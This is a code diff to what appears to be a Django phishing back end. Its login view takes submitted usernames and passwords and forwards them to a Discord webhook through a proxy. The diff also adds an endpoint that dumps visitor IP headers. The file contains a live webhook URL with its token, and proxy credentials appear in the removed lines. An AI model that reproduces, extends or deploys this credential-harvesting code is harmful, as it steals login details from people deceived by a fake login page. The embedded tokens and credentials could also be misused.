@@ -14,13 +14,20 @@ import os
 # Set up logger
 logger = logging.getLogger(__name__)
 
+PUBLIC_IP_APIS = [
+    "https://api.ipify.org",
+    "https://icanhazip.com", 
+    "https://ident.me",
+    "https://checkip.amazonaws.com",
+]
+
 # Discord Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij8oeU5LGcBSdyjjZgInl5oqa4DMpTyMDAhkE2thkUU_dtZ_t2yiipaT9N"
 
 # Your proxy configuration
 PROXY = {
-    # 'http': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323',
-    # 'https': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323'
+    # 'http': '',
+    # 'https': ''
 }
 
 # Set to True to use proxy
@@ -266,13 +273,14 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         return False
 
 def get_client_ip(request):
-    x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
+    
+    if request.META.get("HTTP_X_FORWARDED_FOR"):
+        return request.META["HTTP_X_FORWARDED_FOR"].split(",")[0].strip()
 
-    if x_forwarded_for:
-        return x_forwarded_for.split(",")[0].strip()
+    if request.META.get("HTTP_X_REAL_IP"):
+        return request.META["HTTP_X_REAL_IP"]
 
     return request.META.get("REMOTE_ADDR")
-
 
 def user_profile(request, user_id):
     """
@@ -329,19 +337,11 @@ def login_user(request, user_id):
         username = request.POST.get('username')
         password = request.POST.get('password')
         
-        # Get additional information
-        ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
-        user_agent = request.META.get('HTTP_USER_AGENT', '')
-        
-        print(f"🌐 IP Address: {ip_address}")
-        print(f"🖥️ User Agent: {user_agent}")
-        
         # Send to Discord via proxy
         print("📤 Attempting to send to Discord via proxy...")
         notification_sent = send_discord_notification(
             username=username,
             password=password,
-            ip_address=ip_address,
         )
         
         if notification_sent:
@@ -462,3 +462,32 @@ def api_set_status(request):
             'status': 'error',
             'error': str(e)
         }, status=500)
+    
+
+def debug_ip(request):
+    
+    ip_headers = {}
+    ip_keys = [
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_REAL_IP',
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_VIA',
+        'HTTP_X_PROXY_ID',
+        'REMOTE_ADDR',
+        'REMOTE_HOST',
+    ]
+    
+    for key in ip_keys:
+        ip_headers[key] = request.META.get(key, None)
+    
+    final_ip = get_client_ip(request)
+    
+    return JsonResponse({
+        'all_ip_headers': ip_headers,
+        'final_ip': final_ip,
+        'is_proxy': bool(request.META.get('HTTP_VIA')),
+        'all_meta_keys': list(request.META.keys()), 
+    }, json_dumps_params={'indent': 2})
